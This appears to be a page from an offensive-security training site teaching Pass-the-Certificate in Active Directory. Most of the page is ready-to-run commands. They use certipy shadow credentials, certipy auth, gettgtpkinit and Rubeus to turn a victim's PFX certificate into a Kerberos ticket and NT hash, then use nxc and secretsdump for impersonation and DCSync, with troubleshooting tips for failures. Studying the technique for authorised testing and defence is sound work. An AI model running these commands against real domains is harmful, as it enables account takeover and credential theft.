---
title: Pass-the-Certificate
slug: pass-the-certificate
area: active-directory
module: 10
order: 3
goal: Turn a user or machine certificate (PFX) into a Kerberos TGT and their NT hash via PKINIT.
summary: How to do Pass-the-Certificate — authenticate to Kerberos with an X.509 certificate using certipy or gettgtpkinit, getting a TGT and the account's NT hash back.
prereqs: [A certificate with its private key as a .pfx (from AD CS / ESC abuse or shadow credentials), The CA/DC reachable and the PKINIT (certificate) auth path enabled, Clocks within 5 minutes of the DC]
seeAlso: [tool:certipy, tool:rubeus, tool:impacket, map:active-directory, map:credential-access]
references:
  - The Hacker Recipes: AD CS (certificates) | https://www.thehacker.recipes/ad/movement/ad-cs/
  - Certipy | https://github.com/ly4k/Certipy
---

Active Directory lets a certificate stand in for a password (PKINIT). If you hold a certificate **and its private key** for an account, you can get a Kerberos TGT as that account — and, as a bonus, recover its NT hash. This is how an AD CS abuse (ESC1–ESC8) or a shadow-credentials attack turns into usable access.

## Where the PFX comes from

A prior step gave it to you: an AD CS template abuse, or adding a Key Credential (shadow credentials) to an account you can write.

```bash
# e.g. shadow credentials writes a cert for the victim and hands you the pfx
certipy shadow auto -u you@corp.local -p pass -account victim -dc-ip DCIP
```

## Authenticate with the certificate (Linux)

`certipy auth` does PKINIT and prints both the TGT (as a .ccache) and the NT hash.

```bash
certipy auth -pfx victim.pfx -dc-ip DCIP
export KRB5CCNAME=victim.ccache
# lower level, if you prefer: gettgtpkinit.py then use the ccache
gettgtpkinit.py -cert-pfx victim.pfx corp.local/victim victim.ccache
```

## Authenticate with the certificate (Windows)

```cmd
Rubeus.exe asktgt /user:victim /certificate:victim.pfx /password:<pfxpass> /ptt
```

## Use what you got back

```bash
klist                                            # the PKINIT TGT
nxc smb DC01 --use-kcache                         # act as the user
# or take the recovered NT hash and Pass-the-Hash / DCSync
secretsdump.py -hashes :<nthash> 'corp.local/victim@DC01' -just-dc
```

## If it fails

- **KDC_ERR_PADATA_TYPE_NOSUPP**: PKINIT isn't available — the DC has no KDC certificate / the CA chain isn't trusted. Fall back to the UnPAC-the-hash path or another vector.
- **Clock skew**: sync time to the DC.
- **PFX password**: certipy's PFX may be passwordless; supply `-pfx-password` only if one was set.
- **Certificate not yet valid / expired**: check the validity window; request a fresh one.

## Verify

```bash
klist                                            # principal = the victim
```
